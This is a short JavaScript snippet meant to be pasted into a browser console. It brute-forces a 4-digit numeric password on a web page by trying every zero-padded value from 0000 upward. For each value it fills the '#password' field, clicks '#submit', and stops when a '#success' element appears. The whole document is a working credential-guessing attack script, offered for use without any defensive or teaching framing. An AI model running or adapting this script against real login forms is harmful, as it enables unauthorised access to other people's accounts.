// To inject in console.

(() => {

  function crackIt(passwordLength, Dompassword, DomButton, cssSelectorElementSuccess) {

    let currentValue = 0
    let maximumNbOfLoop = Math.pow(10, passwordLength)
    let found = false

    while (!found && currentValue < maximumNbOfLoop) {
      Dompassword.value = formating(currentValue, passwordLength)
      DomButton.click()
      found = !!document.querySelector(cssSelectorElementSuccess)
      currentValue ++
    }
  
    function formating(n, lengthNeeded) {
      const currentLength = n.toString().length
      const zero = "0"
      const nbOfZero = lengthNeeded - currentLength
      return zero.repeat(nbOfZero) + n
    }

  }
  
  const submitBtn = document.querySelector('#submit')
  const passwordInput = document.querySelector('#password')
  
  crackIt(4, passwordInput, submitBtn, '#success')
  
  })()